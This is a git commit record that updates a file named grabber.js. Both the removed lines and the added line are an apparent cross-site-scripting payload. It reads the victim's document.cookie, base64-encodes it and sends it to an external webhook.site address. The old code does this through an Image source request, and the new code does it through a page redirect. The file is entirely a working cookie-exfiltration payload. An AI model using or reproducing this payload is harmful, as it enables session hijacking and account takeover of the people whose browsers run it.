9a59aadc9b4020e92f227bfba1a674bfb73ce833
Yovecio18 <46889019+yovecio18@users.noreply.github.com>
2024-08-09 16:08:33 +0200

    Update grabber.js

--- grabber.js
+++ grabber.js
@@ -1,2 +1,1 @@
-x = new Image(); 
-x.src = 'https://webhook.site/33f2b84f-a739-4729-85a9-84a72b945823/?cookie='+btoa(document.cookie);
+location = 'https://webhook.site/33f2b84f-a739-4729-85a9-84a72b945823/?cookie='+btoa(document.cookie);
